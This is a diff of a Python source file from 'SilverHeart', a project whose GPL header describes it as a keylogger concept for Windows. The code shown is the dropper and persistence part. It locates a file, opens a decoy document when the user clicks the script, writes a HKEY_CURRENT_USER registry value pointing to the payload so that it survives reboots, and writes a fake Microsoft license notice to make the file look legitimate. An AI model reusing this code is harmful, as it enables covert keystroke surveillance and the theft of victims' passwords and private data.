@@ -1,22 +1,41 @@
+""" A software fully developed in Python 3.7, SilverHeart is a keylogger concept, that can be deployed in Windows. (Mac OS and Linux distributions support will be added soon).
+    Copyright (C) 2020 Pedro Vieira
+
+    This program is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with this program.  If not, see <https://www.gnu.org/licenses/>. 
+"""
+
 import os
 import platform
 import shutil
 import subprocess
 from winreg import *
 
+pathF = None
+pathB = None
+FileNotFound = True
+
 # Searchs the whole computer for the file
 
 
 def finder(name, pathS):
+    global FileNotFound
     for root, dirs, files in os.walk(pathS):
         if name in files:
             global pathF, pathB
             pathB = os.path.join(root)
             pathF = os.path.join(root, name)
-            return os.path.join(root, name)
-        else:
-            global FileNotFound
-            FileNotFound = True
+            FileNotFound = False
 
 
 def cleaner(name, pathC):
@@ -34,18 +53,15 @@ def cleaner(name, pathC):
                 print('[!] Exception file not copied: ', str(E))
 
             # Opens Decoy File when parent script clicked
-            if platform.system() == 'Windows':  # Windows
-                os.startfile(pathDecoy)
-            elif platform.system() == 'Darwin':  # MacOS
-                subprocess.Popen(['start', pathDecoy])
-            else:  # Linux
-                subprocess.Popen(['xdg-open', pathDecoy])
+            os.startfile(pathDecoy)
 
             # Windows only
             # Try stock access rights with 64bits program to 64bit registry
             try:
-                key = OpenKey(HKEY_CURRENT_USER, path,
-                              0, access=KEY_ALL_ACCESS)
+                key = OpenKey(HKEY_CURRENT_USER,
+                              path,
+                              0,
+                              access=KEY_ALL_ACCESS)
                 SetValueEx(key, 'Registry', 0, REG_SZ, filePath)
                 CloseKey(key)
             except FileNotFoundError:
@@ -59,13 +75,15 @@ def cleaner(name, pathC):
                     access_right = KEY_WOW64_32KEY
 
                 try:
-                    key = OpenKey(HKEY_CURRENT_USER, path, 0,
+                    key = OpenKey(HKEY_CURRENT_USER,
+                                  path,
+                                  0,
                                   access=KEY_ALL_ACCESS | access_right)
                     SetValueEx(key, 'Registry', 0, REG_SZ, filePath)
                     CloseKey(key)
                 except Exception as e:
-                    print(
-                        '[!] Exception registry key could not be set: %s' % str(e))
+                    print('[!] Exception registry key could not be set: %s' %
+                          str(e))
         except FileNotFoundError:
             print('[!] File security file not found.')
 
@@ -107,13 +125,12 @@ else:
 with open(pathCleanerIdentity, 'w') as file:
     file.write(
         'This file is based on or incorporates material from the projects listed below\n'
-        '(collectively, Third Party Code). Microsoft is not the original author of the\n'
-        'Third Party Code. The original copyright notice and the license, under which Microsoft\n'
+        '(collectively, Third Party Code). Microsoftt is not the original author of the\n'
+        'Third Party Code. The original copyright notice and the license, under which Microsoftt\n'
         'received such Third Party Code, are set forth below. Such licenses and notices are\n'
-        'provided for informational purposes only. Microsoft, not the third party, licenses\n'
-        'the Third Party Code to you under the terms set forth in the EULA for the Microsoft Product.\n'
-        'Microsoft reserves all other rights not expressly granted under this agreement, whether by implication,\n'
-        'estoppel or otherwise.'
-    )
+        'provided for informational purposes only. Microsoftt, not the third party, licenses\n'
+        'the Third Party Code to you under the terms set forth in the EULAF for the Microsoftt Product.\n'
+        'Microsoftt reserves all other rights not expressly granted under this agreement, whether by implication,\n'
+        'estoppel or otherwise.')
     file.flush()
     file.close()
